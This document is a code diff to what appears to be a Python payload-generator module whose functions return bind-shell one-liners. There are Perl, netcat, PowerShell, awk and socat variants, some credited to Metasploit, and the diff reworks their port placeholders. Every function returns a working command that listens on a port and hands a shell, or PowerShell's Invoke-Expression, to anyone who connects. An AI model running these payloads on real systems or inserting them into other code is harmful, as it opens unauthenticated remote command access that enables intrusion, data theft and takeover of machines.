@@ -15,7 +15,7 @@ def BIND_PERL_TCP():
 
 
 def BIND_PERL_UDP():
-    return """perl -MIO::Socket::INET -e '$|=1;$VAR1=new IO::Socket::INET->new();$VAR1 = new IO::Socket::INET(LocalPort => "PORT",Proto => "udp");while(1) { $VAR1->recv($VAR2,1024);$VAR3=$VAR1->peerhost();$VAR4=$VAR1->peerport();$VAR5=qx($VAR2);$VAR1->send($VAR5);}'"""
+    return """perl -MIO::Socket::INET -e '$|=1;$VAR1=new IO::Socket::INET->new();$VAR1 = new IO::Socket::INET(LocalPort => PORT,Proto => "udp");while(NUM1){ $VAR1->recv($VAR2,1024);$VAR3=$VAR1->peerhost();$VAR4=$VAR1->peerport();$VAR5=qx($VAR2);$VAR1->send($VAR5);}'"""
 
 
 def BIND_PHP_TCP():
@@ -35,31 +35,31 @@ def BIND_RUBY_UDP():
 
 
 def BIND_NETCAT_TCP():
-    return """rm /tmp/VAR1;mkfifo /tmp/VAR1;cat /tmp/VAR1|/bin/sh -i 2>&1|nc -lvp PORT >/tmp/VAR1"""
+    return """rm /tmp/VAR1;mkfifo /tmp/VAR1;cat /tmp/VAR1|/bin/sh -i 2>&1|nc -lvp $((PORT)) >/tmp/VAR1"""
 
 
 def BIND_NETCAT_OPENBSD_UDP():
-    return """coproc nc -luvp PORT; exec /bin/bash <&0${COPROC[0]} >&${COPROC[1]} 2>&1"""
+    return """coproc nc -luvp $((PORT)); exec /bin/bash <&0${COPROC[0]} >&${COPROC[1]} 2>&1"""
 
 
 def BIND_NETCAT_TRADITIONAL_TCP():
-    return """nc -lvp PORT -c /bin/bash"""
+    return """nc -lvp $((PORT)) -c /bin/bash"""
 
 
 def BIND_POWERSHELL_TCP():
-    return """powershell.exe -nop -ep bypass -Command '$VAR1=PORT;$VAR2=[System.Net.Sockets.TcpListener]$VAR1;$VAR2.Start();$VAR3 = $VAR2.AcceptTCPClient();$VAR4=$VAR3.GetStream();[byte[]]$VAR5 = 0..65535|%{0};$VAR6 = ([text.encoding]::ASCII).GetBytes(\\"Windows PowerShell running as user \\" + $env:username + \\" on \\" + $env:computername + \\"`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n\\");$VAR4.Write($VAR6,0,$VAR6.Length);$VAR6 = ([text.encoding]::ASCII).GetBytes(\\"PS \\" + (Get-Location).Path + \\"> \\");$VAR4.Write($VAR6,0,$VAR6.Length);while(($VAR7 = $VAR4.Read($VAR5, 0, $VAR5.Length)) -ne 0){$VAR9 = ([text.encoding]::ASCII).GetString($VAR5, 0, $VAR7);try{$VAR8 = (Invoke-Expression -command $VAR9 2>&1|Out-String )}catch{Write-Warning \\"Something went wrong with execution of command on the target.\\"; Write-Error $_; };$VAR10 = $VAR8 +  \\"PS \\" + (Get-Location).Path + \\"> \\";$VAR11 = ($error[0]|Out-String);$error.clear();$VAR10 = $VAR10 + $VAR11;$VAR6 = ([text.encoding]::ASCII).GetBytes($VAR10);$VAR4.Write($VAR6, 0, $VAR6.Length); $VAR4.Flush();};$VAR3.Close();if($VAR2){$VAR2.Stop();};'"""
+    return """powershell.exe -nop -ep bypass -Command '$VAR1=PORT;$VAR2=[System.Net.Sockets.TcpListener]$VAR1;$VAR2.Start();$VAR3=$VAR2.AcceptTCPClient();$VAR4=$VAR3.GetStream();[byte[]]$VAR5=0..65535|%{0};$VAR6=([text.encoding]::ASCII).GetBytes(\\"Windows PowerShell running as user \\"+$env:username+\\" on \\"+$env:computername+\\"\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\n\n\\");$VAR4.Write($VAR6,0,$VAR6.Length);$VAR6=([text.encoding]::ASCII).GetBytes(\\"PS \\"+(Get-Location).Path+\\"> \\");$VAR4.Write($VAR6,0,$VAR6.Length);while(($VAR7=$VAR4.Read($VAR5,0,$VAR5.Length)) -ne 0){$VAR8=([text.encoding]::ASCII).GetString($VAR5,0,$VAR7);try{$VAR9=(Invoke-Expression -command $VAR8 2>&1 | Out-String )}catch{Write-Warning \\"Something went wrong with execution of command on the target.\\";Write-Error $_;};$VAR10=$VAR9+ \\"PS \\"+(Get-Location).Path+\\"> \\";$VAR11=($error[0] | Out-String);$error.clear();$VAR10=$VAR10+$VAR11;$VAR6=([text.encoding]::ASCII).GetBytes($VAR10);$VAR4.Write($VAR6,0,$VAR6.Length);$VAR4.Flush();};$VAR3.Close();if($VAR2){$VAR2.Stop();};'"""
 
 
 # Removed from MetasploitFramework
 # https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/cmd/unix/bind_awk.rb
 def BIND_AWK_TCP():
-    return "awk 'BEGIN{VAR1=\"/inet/tcp/PORT/0/0\";for(;VAR1|&getline VAR2;close(VAR2))while(VAR2|getline)print|&VAR1;close(VAR1)}'"
+    return """VAR1=$((PORT));awk -v VAR2="$VAR1" 'BEGIN{VAR3=\"/inet/tcp/"VAR2"/0/0\";for(;VAR3|&getline VAR4;close(VAR4))while(VAR4|getline)print|&VAR3;close(VAR3)}'"""
 
 
 # Removed from MetasploitFramework
 # https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/cmd/unix/bind_socat_udp.rb
 def BIND_SOCAT_UDP():
-    return "socat udp-listen:PORT exec:'bash -li',pty,stderr,sane 2>&1>/dev/null &"
+    return "socat udp-listen:$((PORT)) exec:'bash -li',pty,stderr,sane 2>&1>/dev/null &"
 
 
 def BIND_POWERSHELL_NISHANG_TCP():
